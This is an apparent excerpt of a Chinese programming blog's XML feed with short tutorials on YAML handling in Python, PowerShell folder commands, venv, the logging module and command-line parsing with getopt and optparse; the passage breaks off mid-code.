        <content type="html"><![CDATA[<h3 id="yaml规则"><a href="#yaml规则" class="headerlink" title="yaml规则"></a>yaml规则</h3><p>YAML有以下基本规则：<br>1、大小写敏感<br>2、使用缩进表示层级关系<br>3、禁止使用tab缩进，只能使用空格键<br>4、缩进长度没有限制，只要元素对齐就表示这些元素属于一个层级。<br>5、使用#表示注释<br>6、字符串可以不用引号标注</p><h3 id="yaml数据结构"><a href="#yaml数据结构" class="headerlink" title="yaml数据结构"></a>yaml数据结构</h3><ul><li>对象：键值对的集合（简称 “映射或字典”）<br>键值对用冒号 “:” 结构表示，冒号与值之间需用空格分隔</li><li>数组：一组按序排列的值（简称 “序列或列表”）<br>数组前加有 “-” 符号，符号与值之间需用空格分隔</li><li>纯量(scalars)：单个的、不可再分的值（如：字符串、bool值、整数、浮点数、时间、日期、null等）<br>None值可用null可 ~ 表示</li></ul><h3 id="使用python操作yaml文件"><a href="#使用python操作yaml文件" class="headerlink" title="使用python操作yaml文件"></a>使用python操作yaml文件</h3><h4 id="yaml模块"><a href="#yaml模块" class="headerlink" title="yaml模块"></a>yaml模块</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">yamlDemo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    yamldata <span class="token operator">=</span> <span class="token punctuation">{</span>        <span class="token string">"demo1"</span><span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">,</span>        <span class="token string">"demo2"</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token string">"demo3"</span><span class="token punctuation">:</span> <span class="token punctuation">{</span><span class="token string">'demo4'</span><span class="token punctuation">:</span> <span class="token number">4</span><span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token comment"># 将数据写入yaml文件</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'demo_w'</span><span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> fp<span class="token punctuation">:</span>        fp<span class="token punctuation">.</span>write<span class="token punctuation">(</span>yaml<span class="token punctuation">.</span>dump<span class="token punctuation">(</span>yamldata<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment"># 读取文件数据并转换为python对象</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'demo_w'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> fp<span class="token punctuation">:</span>        yamldata_r <span class="token operator">=</span> yaml<span class="token punctuation">.</span>load<span class="token punctuation">(</span>fp<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> Loader<span class="token operator">=</span>yaml<span class="token punctuation">.</span>FullLoader<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>yamldata_r<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>文件数据</p><pre class="line-numbers language-none"><code class="language-none">demo1: 1demo2:- 1- 2- 3- 4demo3:  demo4: 4<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="ruamel-yaml模块"><a href="#ruamel-yaml模块" class="headerlink" title="ruamel.yaml模块"></a>ruamel.yaml模块</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">ruamelDemo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    yamldata <span class="token operator">=</span> <span class="token punctuation">{</span>        <span class="token string">"demo1"</span><span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">,</span>        <span class="token string">"demo2"</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token string">"demo3"</span><span class="token punctuation">:</span> <span class="token punctuation">{</span><span class="token string">'demo4'</span><span class="token punctuation">:</span> <span class="token number">4</span><span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token comment"># 将数据写入yaml文件</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'demo_w2'</span><span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> fp<span class="token punctuation">:</span>        fp<span class="token punctuation">.</span>write<span class="token punctuation">(</span>ruamel<span class="token punctuation">.</span>yaml<span class="token punctuation">.</span>dump<span class="token punctuation">(</span>yamldata<span class="token punctuation">,</span> Dumper<span class="token operator">=</span>ruamel<span class="token punctuation">.</span>yaml<span class="token punctuation">.</span>RoundTripDumper<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment"># 读取文件数据并转换为python对象</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'demo_w2'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> fp<span class="token punctuation">:</span>        yamldata_r <span class="token operator">=</span> ruamel<span class="token punctuation">.</span>yaml<span class="token punctuation">.</span>load<span class="token punctuation">(</span>fp<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> Loader<span class="token operator">=</span>ruamel<span class="token punctuation">.</span>yaml<span class="token punctuation">.</span>Loader<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>yamldata_r<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>文件内容</p><pre class="line-numbers language-none"><code class="language-none">demo1: 1demo2:- 1- 2- 3- 4demo3:  demo4: 4<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Code </category>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> yaml </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux日志</title>
      <link href="//blogs/linux-ri-zhi/"/>
      <url>//blogs/linux-ri-zhi/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> blogs </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>powershell常用命令</title>
      <link href="//blogs/powershell-ming-ling/"/>
      <url>//blogs/powershell-ming-ling/</url>
      
        <content type="html"><![CDATA[<p>打开当前文件夹</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token function">ii</span> <span class="token punctuation">.</span><span class="token function">Invoke-Item</span> <span class="token punctuation">.</span>explorer <span class="token punctuation">.</span><span class="token function">start</span> <span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-cmd" data-language="cmd"><code class="language-cmd">explorer .start . # 不加参数则新建一个cmd窗口<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> blogs </category>
          
      </categories>
      
      
        <tags>
            
            <tag> powershell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python虚拟环境</title>
      <link href="//python/python-xu-ni-huan-jing/"/>
      <url>//python/python-xu-ni-huan-jing/</url>
      
        <content type="html"><![CDATA[<h3 id="venv模块"><a href="#venv模块" class="headerlink" title="venv模块"></a>venv模块</h3><ol><li><p>创建虚拟环境</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">python <span class="token operator">-</span>m venv venv <span class="token comment"># -m 指定使用venv模块，后面的venv表示目录</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>激活虚拟环境</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># linux</span>source venv<span class="token operator">/</span><span class="token builtin">bin</span><span class="token operator">/</span>activate<span class="token comment"># windows</span>venv\Scripts\activate<span class="token punctuation">.</span>bat <span class="token comment"># cmd</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>退出虚拟环境</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">deactivate<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> venv </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python日志模块</title>
      <link href="//code/python/python-ri-zhi-mo-kuai/"/>
      <url>//code/python/python-ri-zhi-mo-kuai/</url>
      
        <content type="html"><![CDATA[<h3 id="logging模块"><a href="#logging模块" class="headerlink" title="logging模块"></a>logging模块</h3><h4 id="日志格式"><a href="#日志格式" class="headerlink" title="日志格式"></a>日志格式</h4><p>常用格式</p><ul><li>%(levelno)s: 打印日志级别的数值</li><li>%(levelname)s: 打印日志级别名称</li><li>%(pathname)s: 打印当前执行程序的路径，其实就是sys.argv[0]</li><li>%(filename)s: 打印当前执行程序名</li><li>%(funcName)s: 打印日志的当前函数</li><li>%(lineno)d: 打印日志的当前行号</li><li>%(asctime)s: 打印日志的时间</li><li>%(thread)d: 打印线程ID</li><li>%(threadName)s: 打印线程名称</li><li>%(process)d: 打印进程ID</li><li>%(message)s: 打印日志信息</li></ul><h3 id="控制台日志"><a href="#控制台日志" class="headerlink" title="控制台日志"></a>控制台日志</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> logging<span class="token keyword">import</span> timelogformat <span class="token operator">=</span> <span class="token string">'%(asctime)s - %(filename)s[line:%(lineno)d] [%(funcName)s]- %(levelname)s: %(message)s'</span>  <span class="token comment"># 日志格式</span>logging<span class="token punctuation">.</span>basicConfig<span class="token punctuation">(</span>level<span class="token operator">=</span>logging<span class="token punctuation">.</span>DEBUG<span class="token punctuation">,</span> <span class="token builtin">format</span><span class="token operator">=</span>logformat<span class="token punctuation">)</span>  <span class="token comment"># 设置日志级别，设置日志格式</span>logging<span class="token punctuation">.</span>debug<span class="token punctuation">(</span><span class="token string">'DEBUG'</span><span class="token punctuation">)</span>logging<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">'INFO'</span><span class="token punctuation">)</span>logging<span class="token punctuation">.</span>error<span class="token punctuation">(</span><span class="token string">'ERROR'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="文件日志"><a href="#文件日志" class="headerlink" title="文件日志"></a>文件日志</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> logging<span class="token keyword">import</span> time<span class="token keyword">import</span> os<span class="token comment"># 第一步，创建一个logger</span>logger <span class="token operator">=</span> logging<span class="token punctuation">.</span>getLogger<span class="token punctuation">(</span><span class="token punctuation">)</span>logger<span class="token punctuation">.</span>setLevel<span class="token punctuation">(</span>logging<span class="token punctuation">.</span>INFO<span class="token punctuation">)</span>  <span class="token comment"># Log等级总开关</span><span class="token comment"># 第二步，创建一个handler，用于写入日志文件</span>rq <span class="token operator">=</span> time<span class="token punctuation">.</span>strftime<span class="token punctuation">(</span><span class="token string">'%Y%m%d%H%M'</span><span class="token punctuation">,</span> time<span class="token punctuation">.</span>localtime<span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>log_path <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>dirname<span class="token punctuation">(</span>os<span class="token punctuation">.</span>getcwd<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'/Logs/'</span>log_name <span class="token operator">=</span> log_path <span class="token operator">+</span> rq <span class="token operator">+</span> <span class="token string">'.log'</span>logfile <span class="token operator">=</span> log_namefh <span class="token operator">=</span> logging<span class="token punctuation">.</span>FileHandler<span class="token punctuation">(</span>logfile<span class="token punctuation">,</span> mode<span class="token operator">=</span><span class="token string">'w'</span><span class="token punctuation">)</span>fh<span class="token punctuation">.</span>setLevel<span class="token punctuation">(</span>logging<span class="token punctuation">.</span>DEBUG<span class="token punctuation">)</span>  <span class="token comment"># 输出到file的log等级的开关</span><span class="token comment"># 第三步，定义handler的输出格式</span>formatter <span class="token operator">=</span> logging<span class="token punctuation">.</span>Formatter<span class="token punctuation">(</span><span class="token string">"%(asctime)s - %(filename)s[line:%(lineno)d] - %(levelname)s: %(message)s"</span><span class="token punctuation">)</span>fh<span class="token punctuation">.</span>setFormatter<span class="token punctuation">(</span>formatter<span class="token punctuation">)</span><span class="token comment"># 第四步，将logger添加到handler里面</span>logger<span class="token punctuation">.</span>addHandler<span class="token punctuation">(</span>fh<span class="token punctuation">)</span><span class="token comment"># 日志</span>logger<span class="token punctuation">.</span>debug<span class="token punctuation">(</span><span class="token string">'this is a logger debug message'</span><span class="token punctuation">)</span>logger<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">'this is a logger info message'</span><span class="token punctuation">)</span>logger<span class="token punctuation">.</span>warning<span class="token punctuation">(</span><span class="token string">'this is a logger warning message'</span><span class="token punctuation">)</span>logger<span class="token punctuation">.</span>error<span class="token punctuation">(</span><span class="token string">'this is a logger error message'</span><span class="token punctuation">)</span>logger<span class="token punctuation">.</span>critical<span class="token punctuation">(</span><span class="token string">'this is a logger critical message'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="控制台文件日志"><a href="#控制台文件日志" class="headerlink" title="控制台文件日志"></a>控制台文件日志</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> logging<span class="token keyword">import</span> time<span class="token keyword">import</span> oslogger <span class="token operator">=</span> logging<span class="token punctuation">.</span>getLogger<span class="token punctuation">(</span><span class="token punctuation">)</span>logger<span class="token punctuation">.</span>setLevel<span class="token punctuation">(</span>logging<span class="token punctuation">.</span>DEBUG<span class="token punctuation">)</span><span class="token comment"># 创建日志文件handler，用于写日志文件</span>rq <span class="token operator">=</span> time<span class="token punctuation">.</span>strftime<span class="token punctuation">(</span><span class="token string">'%Y%m%d%H%M'</span><span class="token punctuation">,</span> time<span class="token punctuation">.</span>localtime<span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 日志文件用时间戳命名</span>log_path <span class="token operator">=</span> <span class="token string">'./'</span>log_name <span class="token operator">=</span> log_path <span class="token operator">+</span> rq <span class="token operator">+</span> <span class="token string">'.log'</span>logfile <span class="token operator">=</span> log_namefh <span class="token operator">=</span> logging<span class="token punctuation">.</span>FileHandler<span class="token punctuation">(</span>logfile<span class="token punctuation">,</span> mode<span class="token operator">=</span><span class="token string">'w'</span><span class="token punctuation">)</span>fh<span class="token punctuation">.</span>setLevel<span class="token punctuation">(</span>logging<span class="token punctuation">.</span>DEBUG<span class="token punctuation">)</span><span class="token comment"># 创建控制台日志handler</span>ch <span class="token operator">=</span> logging<span class="token punctuation">.</span>StreamHandler<span class="token punctuation">(</span><span class="token punctuation">)</span>ch<span class="token punctuation">.</span>setLevel<span class="token punctuation">(</span>logging<span class="token punctuation">.</span>DEBUG<span class="token punctuation">)</span><span class="token comment"># 设置日志格式</span>logformat <span class="token operator">=</span> <span class="token string">'%(asctime)s - %(filename)s[line:%(lineno)d] [%(funcName)s]- %(levelname)s: %(message)s'</span>  <span class="token comment"># 日志格式</span>formatter <span class="token operator">=</span> logging<span class="token punctuation">.</span>Formatter<span class="token punctuation">(</span>logformat<span class="token punctuation">)</span>  <span class="token comment"># 使用Formatter方法将字符串转换成合法格式</span>fh<span class="token punctuation">.</span>setFormatter<span class="token punctuation">(</span>formatter<span class="token punctuation">)</span>ch<span class="token punctuation">.</span>setFormatter<span class="token punctuation">(</span>formatter<span class="token punctuation">)</span>logger<span class="token punctuation">.</span>addHandler<span class="token punctuation">(</span>fh<span class="token punctuation">)</span>logger<span class="token punctuation">.</span>addHandler<span class="token punctuation">(</span>ch<span class="token punctuation">)</span>logger<span class="token punctuation">.</span>debug<span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span>logger<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span>logger<span class="token punctuation">.</span>error<span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span>logger<span class="token punctuation">.</span>warning<span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span>logger<span class="token punctuation">.</span>critical<span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="多文件日志"><a href="#多文件日志" class="headerlink" title="多文件日志"></a>多文件日志</h3><ol><li>建一个专门管理日志的模块，设置好日志格式</li><li>当需要输出文件时，直接导入建好的日志模块然后导入logging包</li></ol><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul><li><a href="https://www.cnblogs.com/dplearning/p/5088074.html">https://www.cnblogs.com/dplearning/p/5088074.html</a></li><li><a href="https://blog.csdn.net/feng98ren/article/details/80044019">https://blog.csdn.net/feng98ren/article/details/80044019</a></li><li><a href="https://docs.python.org/zh-cn/3/library/logging.html">https://docs.python.org/zh-cn/3/library/logging.html</a></li><li><a href="https://www.cnblogs.com/hanmk/p/10448963.html">https://www.cnblogs.com/hanmk/p/10448963.html</a></li><li><a href="https://www.cnblogs.com/xianyulouie/p/11041777.html">https://www.cnblogs.com/xianyulouie/p/11041777.html</a></li><li></li></ul>]]></content>
      
      
      <categories>
          
          <category> Code </category>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 日志 </tag>
            
            <tag> logging </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python命令行参数</title>
      <link href="//code/python/python-ming-ling-xing-can-shu/"/>
      <url>//code/python/python-ming-ling-xing-can-shu/</url>
      
        <content type="html"><![CDATA[<p>python 处理命令行参数</p><h3 id="sys-argv"><a href="#sys-argv" class="headerlink" title="sys.argv"></a>sys.argv</h3><p>sys.argv是接受参数的列表，sys.argv[0]表示执行文件名，sys.argv[1:]表示接受的参数</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">python test.py arg1 arg2 arg3<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>使用len(sys.argv)来判断是否传入参数，如果len(sys.argv)等于1，表示没有传入参数；如果len(sys.argv) &gt; 1，表示传入了参数，可以使用sys.argv[1:]获取传入的参数。</p><h3 id="getopt模块"><a href="#getopt模块" class="headerlink" title="getopt模块"></a>getopt模块</h3><p>getopt模块是专门处理命令行参数的模块，用于获取命令行选项和参数，也就是sys.argv。命令行选项使得程序的参数更加灵活。支持短选项模式（-）和长选项模式（–）。</p><p>该模块提供了两个方法及一个异常处理来解析命令行参数。</p><h4 id="getopt-getopt-方法"><a href="#getopt-getopt-方法" class="headerlink" title="getopt.getopt()方法"></a>getopt.getopt()方法</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python">getopt<span class="token punctuation">.</span>getopt<span class="token punctuation">(</span>args<span class="token punctuation">,</span> options<span class="token punctuation">[</span><span class="token punctuation">,</span> long_options<span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>方法参数说明：</p><ul><li><strong>args</strong>: 要解析的命令行参数列表。</li><li><strong>options</strong> : 以字符串的格式定义，<strong>options</strong> 后的冒号 <strong>:</strong> 表示如果设置该选项，必须有附加的参数，否则就不附加参数。</li><li><strong>long_options</strong> : 以列表的格式定义，<strong>long_options</strong> 后的等号 <strong>=</strong> 表示该选项必须有附加的参数，不带冒号表示该选项不附加参数。</li><li>该方法返回值由两个元素组成: 第一个是 <strong>(option, value)</strong> 元组的列表。 第二个是参数列表，包含那些没有 <strong>-</strong> 或 <strong>–</strong> 的参数。</li></ul><h4 id="getopt-gnu-getopt-方法"><a href="#getopt-gnu-getopt-方法" class="headerlink" title="getopt.gnu_getopt()方法"></a>getopt.gnu_getopt()方法</h4><h4 id="异常getopt-GetoptError"><a href="#异常getopt-GetoptError" class="headerlink" title="异常getopt.GetoptError"></a>异常getopt.GetoptError</h4><p>在没有找到参数列表，或选项的需要的参数为空时会触发该异常。</p><p>异常的参数是一个字符串，表示错误的原因。属性 <strong>msg</strong> 和 <strong>opt</strong> 为相关选项的错误信息。</p><h4 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python">helpinfo <span class="token operator">=</span> <span class="token string">"python main.py"</span><span class="token keyword">try</span><span class="token punctuation">:</span>    opts<span class="token punctuation">,</span> args <span class="token operator">=</span> getopt<span class="token punctuation">.</span>getopt<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">'hi:o:'</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">'ifile='</span><span class="token punctuation">,</span> <span class="token string">'ofile='</span><span class="token punctuation">,</span> <span class="token string">'help'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">except</span> getopt<span class="token punctuation">.</span>GetoptError <span class="token keyword">as</span> e<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>opts<span class="token punctuation">,</span> args<span class="token punctuation">)</span><span class="token keyword">if</span> opts <span class="token operator">==</span> <span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token keyword">and</span> args <span class="token operator">==</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>helpinfo<span class="token punctuation">)</span>    sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> opt<span class="token punctuation">,</span> arg <span class="token keyword">in</span> opts<span class="token punctuation">:</span>        <span class="token keyword">if</span> opt <span class="token keyword">in</span> <span class="token punctuation">(</span><span class="token string">'-h'</span><span class="token punctuation">,</span> <span class="token string">'--help'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>helpinfo<span class="token punctuation">)</span>       <span class="token keyword">elif</span> opt <span class="token keyword">in</span> <span class="token punctuation">(</span><span class="token string">'-i'</span><span class="token punctuation">,</span> <span class="token string">'--ifile'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>arg<span class="token punctuation">)</span>        <span class="token keyword">elif</span> opt <span class="token keyword">in</span> <span class="token punctuation">(</span><span class="token string">'-o'</span><span class="token punctuation">,</span> <span class="token string">'--ofile'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>arg<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="optparse模块"><a href="#optparse模块" class="headerlink" title="optparse模块"></a>optparse模块</h3><p>optparse模块主要用来为脚本传递命令参数，采用预先定义好的选项来解析命令行参数，自动生成帮助信息，不需要sys.argv</p><h4 id="实例-1"><a href="#实例-1" class="headerlink" title="实例"></a>实例</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> optparseusage<span class="token operator">=</span><span class="token string">"python %prog -u/--user &lt;target user&gt; -p/--password &lt;target password&gt;"</span>parser<span class="token operator">=</span>optparse<span class="token punctuation">.</span>OptionParser<span class="token punctuation">(</span>usage<span class="token punctuation">)</span> <span class="token comment">## 写入上面定义的帮助信息</span>parser<span class="token punctuation">.</span>add_option<span class="token punctuation">(</span><span class="token string">'-u'</span><span class="token punctuation">,</span> <span class="token string">'--user'</span><span class="token punctuation">,</span>dest<span class="token operator">=</span><span class="token string">'User'</span><span class="token punctuation">,</span><span class="token builtin">type</span><span class="token operator">=</span><span class="token string">'string'</span><span class="token punctuation">,</span><span class="token builtin">help</span><span class="token operator">=</span><span class="token string">'target user'</span><span class="token punctuation">,</span> default<span class="token operator">=</span><span class="token string">'root'</span><span class="token punctuation">)</span>parser<span class="token punctuation">.</span>add_option<span class="token punctuation">(</span><span class="token string">'-p'</span><span class="token punctuation">,</span><span class="token string">'--password'</span><span class="token punctuation">,</span>dest<span class="token operator">=</span><span class="token string">'Pwd'</span><span class="token punctuation">,</span><span class="token builtin">type</span><span class="token operator">=</span><span class="token string">'string'</span><span class="token punctuation">,</span><span class="token builtin">help</span><span class="token operator">=</span><span class="token string">'target password'</span><span class="token punctuation">)</span>options<span class="token punctuation">,</span> args<span class="token operator">=</span>parser<span class="token punctuation">.</span>parse_args<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'options为'</span><span class="token punctuation">,</span> options<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"用户名为"</span><span class="token punctuation">,</span> options<span class="token punctuation">.</span>User<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"密码为"</span><span class="token punctuation">,</span> options<span class="token punctuation">.</span>Pwd<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'args为'</span><span class="token punctuation">,</span> args<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>add_option参数：</p><ul><li>可以设置多个选项字符串，比如上面的 ‘-u’, ‘–user’ 这两个，用的时候任选其一</li><li>dest用于定义选项值存放的位置，作为后面的第一个字典（options）的键，值为命令输入的参数</li><li>type用于检测命令行输入参数的数据类型是否符合要求，有 string（字符串）、int（整数）、float（浮点数）等类型</li><li>help用于定义帮助信息</li><li>default设置默认值</li></ul><h4 id="增加帮助信息分组"><a href="#增加帮助信息分组" class="headerlink" title="增加帮助信息分组"></a>增加帮助信息分组</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> optparseusage<span class="token operator">=</span><span class="token string">"python %prog -u/--user &lt;target user&gt; -p/--password &lt;target password&gt;"</span>parser<span class="token operator">=</span>optparse<span class="token punctuation">.</span>OptionParser<span class="token punctuation">(</span>usage<span class="token punctuation">)</span> <span class="token comment">## 写入上面定义的帮助信息</span>parser<span class="token punctuation">.</span>add_option<span class="token punctuation">(</span><span class="token string">'-u'</span><span class="token punctuation">,</span> <span class="token string">'--user'</span><span class="token punctuation">,</span>dest<span class="token operator">=</span><span class="token string">'User'</span><span class="token punctuation">,</span><span class="token builtin">type</span><span class="token operator">=</span><span class="token string">'string'</span><span class="token punctuation">,</span><span class="token builtin">help</span><span class="token operator">=</span><span class="token string">'target user'</span><span class="token punctuation">,</span> default<span class="token operator">=</span><span class="token string">'root'</span><span class="token punctuation">)</span>parser<span class="token punctuation">.</span>add_option<span class="token punctuation">(</span><span class="token string">'-p'</span><span class="token punctuation">,</span><span class="token string">'--password'</span><span class="token punctuation">,</span>dest<span class="token operator">=</span><span class="token string">'Pwd'</span><span class="token punctuation">,</span><span class="token builtin">type</span><span class="token operator">=</span><span class="token string">'string'</span><span class="token punctuation">,</span><span class="token builtin">help</span><span class="token operator">=</span><span class="token string">'target password'</span><span class="token punctuation">)</span>group <span class="token operator">=</span> optparse<span class="token punctuation">.</span>OptionGroup<span class="token punctuation">(</span>parser<span class="token punctuation">,</span> <span class="token string">'Debug Options'</span><span class="token punctuation">)</span> <span class="token comment">## 创建group分组</span>parser<span class="token punctuation">.</span>add_option_group<span class="token punctuation">(</span>group<span class="token punctuation">)</span>  <span class="token comment">## 把创建的组添加到parser中</span>group<span class="token punctuation">.</span>add_option<span class="token punctuation">(</span><span class="token string">'-d'</span><span class="token punctuation">,</span> <span class="token 